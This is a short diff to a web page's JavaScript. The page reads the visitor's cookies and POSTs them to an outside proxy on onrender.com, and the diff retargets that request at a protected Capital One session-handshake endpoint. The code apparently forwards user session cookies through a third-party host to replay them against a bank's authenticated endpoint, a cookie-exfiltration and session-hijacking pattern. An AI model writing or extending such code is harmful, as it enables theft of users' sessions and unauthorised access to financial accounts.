@@ -17,11 +17,11 @@
       const cookiesDiv = document.getElementById('cookies');
       cookiesDiv.innerHTML = `<h2>Cookies:</h2><pre>${cookies}</pre>`;
       
-      // Proceed with fetching the server response, now including the cookies
+      // Proceed with fetching the session-handshake endpoint on Capital One
       fetch('https://testingphase-74fh.onrender.com/proxy', {
         method: 'POST',
         body: JSON.stringify({
-          targetUrl: 'https://coaf-prequalification.capitalone.com/',  // Target URL
+          targetUrl: 'https://coaf-prequalification.capitalone.com/protected/476043/auto/application/session-handshake',  // Target endpoint
           userCookies: cookies  // Include user's cookies in the request body
         }),
         headers: {
@@ -44,6 +44,8 @@
       })
       .catch(error => {
         console.error('Error fetching data:', error);
+        const responseDiv = document.getElementById('response');
+        responseDiv.innerHTML = `<h2>Error:</h2><pre>${error}</pre>`;
       });
     });
   </script>
